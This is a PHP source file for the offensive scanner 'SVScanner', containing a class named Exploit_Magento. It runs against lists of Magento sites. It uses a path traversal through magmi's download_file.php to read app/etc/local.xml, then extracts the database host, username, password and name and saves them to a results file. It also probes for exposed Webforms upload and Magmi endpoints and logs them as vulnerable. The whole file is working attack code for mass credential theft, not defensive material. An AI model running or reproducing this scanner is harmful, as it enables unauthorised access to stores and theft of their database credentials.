<?php
error_reporting(0);
/**
 * @Author: Eka Syahwan
 * @Date:   2018-09-06 23:02:10
 * @Last Modified by:   Eka Syahwan
 * @Last Modified time: 2018-09-14 15:26:07
 */
class Exploit_Magento
{
	function __construct()
	{
		$this->wploit_modules 	= new wploit_modules;
		$this->sdata 			= new Sdata;
		$this->database 		= new Database;
	}
	function scanner($array_url , $datcommand){
		##########################################################################
		mkdir("result");
		mkdir("result/exploit");
		mkdir("result/exploit/magento");
		##########################################################################
		foreach ($array_url as $key => $dataURL) {
			$url[] 				=  array('url' 		=> $dataURL['url'].'/app/etc/local.xml');
			$hea[] 				=  array('follow' 	=> false, 'rto'=> 10);
			$url[] 				=  array('url' 		=> $dataURL['url'].'/magmi/web/download_file.php?file=../../app/etc/local.xml');
			$hea[] 				=  array('follow' 	=> false, 'rto'=> 10);
		}
		echo "\r\n".$this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("navy","Trying search vulnerable Magento LFI ... [ ".count($url)." Request | ".$datcommand."]\r\n");
		$repons = $this->sdata->sdata($url , $hea);
		foreach ($repons as $key => $rdata) {
			
			$xml 	= simplexml_load_string($rdata['respons']);
			$json 	= json_encode($xml);
			$array 	= json_decode($json,TRUE);

			if( is_array( $array ) ){
				preg_match_all('/<host>(.*?)<\/host>/m', 			$rdata['respons'], $host);
				preg_match_all('/<username>(.*?)<\/username>/m', 	$rdata['respons'], $username);
				preg_match_all('/<password>(.*?)<\/password>/m', 	$rdata['respons'], $password);
				preg_match_all('/<dbname>(.*?)<\/dbname>/m', 		$rdata['respons'], $dbname);

				$host 		= str_replace("<![CDATA[", "", str_replace("]]>", "", $host[1][0]));
				$username 	= str_replace("<![CDATA[", "", str_replace("]]>", "", $username[1][0]));
				$password 	= str_replace("<![CDATA[", "", str_replace("]]>", "", $password[1][0]));
				$dbname 	= str_replace("<![CDATA[", "", str_replace("]]>", "", $dbname[1][0]));

				if(!empty($host) && !empty($username) && !empty($password) && !empty($dbname)){
					$result['lfi'][] = $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("nevy","[".$rdata['info']['http_code']."] ".$rdata['info']['url'])." => ".$this->wploit_modules->color("green","[ LFI Config Found ]")."\r\n";
					$fopn 		= fopen("result/exploit/magento/lfi-dbconfig.txt", "a+");
					fwrite($fopn, $host."|".$username."|".$password."|".$dbname."\r\n");
					fclose($fopn);
				}
			}
		}
		unset($url);unset($hea);$this->sdata->session_remove($repons);
		foreach ($array_url as $key => $dataURL) {
			$url[] 				=  array('url' 		=> $dataURL['url'].'/js/webforms/upload/index.php');
			$hea[] 				=  array('follow' 	=> true, 'rto'=> 10);
		}
		echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("navy","Trying search vulnerable Magento Webforms ... [ ".count($url)." Request ]\r\n");
		$respons = $this->sdata->sdata($url , $hea);
		foreach ($respons as $key => $rdata) {
			if($rdata['info']['content-type'] == 'application/json' && $rdata['info']['http_code'] == 200){
				$result['webforms'][] = $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("nevy","[".$rdata['info']['http_code']."] ".$rdata['info']['url'])." => ".$this->wploit_modules->color("green","[ Webforms Found ]")."\r\n";

				$fopn = fopen("result/exploit/magento/webforms.txt", "a+");
				fwrite($fopn, $rdata['info']['url']."\r\n");
				fclose($fopn);
			}
		}

		unset($url);unset($hea);$this->sdata->session_remove($respons);
		foreach ($array_url as $key => $dataURL) {
			$url[] 				=  array('url' 		=> $dataURL['url'].'/magmi/web/magmi.php');
			$hea[] 				=  array('follow' 	=> true, 'rto'=> 10);
		}
		echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("navy","Trying search vulnerable Magento Magmi ... [ ".count($url)." Request ]\r\n");
		$respons = $this->sdata->sdata($url , $hea); 

		foreach ($respons as $key => $rdata) {
			if( preg_match("/Release Information/", $rdata['respons']) && $rdata['info']['http_code'] == 200){
				
				$result['magmi'][] = $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("nevy","[".$rdata['info']['http_code']."] ".$rdata['info']['url'])." => ".$this->wploit_modules->color("green","[ Magmi Found ]")."\r\n";

				$fopn = fopen("result/exploit/magento/magmi.txt", "a+");
				fwrite($fopn, $rdata['info']['url']."\r\n");
				fclose($fopn);
			}
		}

		if(empty($result['lfi'])){
			echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("red",count($url)." request , no one is vulnerable LFI\r\n");
		}
		if(empty($result['webforms'])){
			echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("red",count($url)." request , no one is vulnerable Webforms\r\n");
		}
		if(empty($result['magmi'])){
			echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("red",count($url)." request , no one is vulnerable Magmi\r\n");
		}

		foreach ($result['lfi'] as $key => $lfi) {
			if(!empty($lfi)){
				echo $lfi;
			}
		}
		foreach ($result['webforms'] as $key => $webforms) {
			if(!empty($webforms)){
				echo $webforms;
			}
		}
		foreach ($result['magmi'] as $key => $magmi) {
			if(!empty($magmi)){
				echo $magmi;
			}
		}
		unset($url);unset($hea);unset($result);$this->sdata->session_remove($respons);
	}
}